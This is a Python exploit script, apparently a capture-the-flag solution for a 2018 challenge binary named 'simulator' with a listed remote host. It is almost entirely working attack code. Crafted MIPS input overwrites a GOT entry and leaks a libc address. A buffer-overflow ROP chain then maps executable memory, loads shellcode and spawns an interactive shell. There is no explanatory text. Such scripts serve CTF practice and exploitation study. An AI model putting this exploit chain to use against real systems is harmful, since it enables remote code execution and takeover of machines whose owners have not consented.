#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import commands

bin_file = './simulator'
context(os = 'linux', arch = 'x86')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'simulator.2018.teamrois.cn', 'port':3131})
env.select()

#==========

binf = ELF(bin_file)
addr_got_fail       = binf.got['__stack_chk_fail']
addr_stdout          = binf.symbols['stdout']
addr_regs           = 0x0804da24
addr_ret            = 0x0804852e
addr_shellcode      = 0x02000000

#==========

def solve_pow(conn):
    chal = conn.recv(16)
    info('chal : ' + chal)

    solution = int(commands.getoutput('./pow {}'.format(chal)))
    info('solution: {}'.format(solution))
    conn.send(p32(solution))
    sleep(0.5)

def attack(conn):
    mipsasm  = 'li $t0, {}\n'.format(addr_ret)
    mipsasm += 'add {}, $t0, 0\n'.format(u(p((addr_got_fail - addr_regs)/8 - 0x20)))
    mipsasm += 'add $a0, {}, 0\n'.format(u(p((addr_stdout - addr_regs)/8 - 0x20)))
    mipsasm += 'li $v0, 1\n'
    mipsasm += 'syscall\n'

    conn.sendline(mipsasm+'END')

    addr = ''
    while len(addr) == 0:
        addr = conn.recvuntil('\n', drop=True)
    addr_libc_stdout    = u(p(int(addr)))
    addr_libc_stdin     = addr_libc_stdout - 0x7c0
    info('addr_libc_stdin    = 0x{:08x}'.format(addr_libc_stdin))

    rop = ROP(binf)
    rop.mmap(addr_shellcode, 0x1000, 7, 0x22, -1, 0)
    rop.fgets(addr_shellcode, 0x1000, addr_libc_stdin)
    rop.call(addr_shellcode)

    exploit  = 'a'*0x20
    exploit += p32(0xdeadbeef)
    exploit += p32(0)*3
    exploit += str(rop)
    conn.sendlineafter('comment: ', exploit)

    shellcode = asm(shellcraft.sh())
    conn.sendline(shellcode)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    if env.check('remote'):
        solve_pow(conn)
    attack(conn)
    conn.interactive()
    
#==========
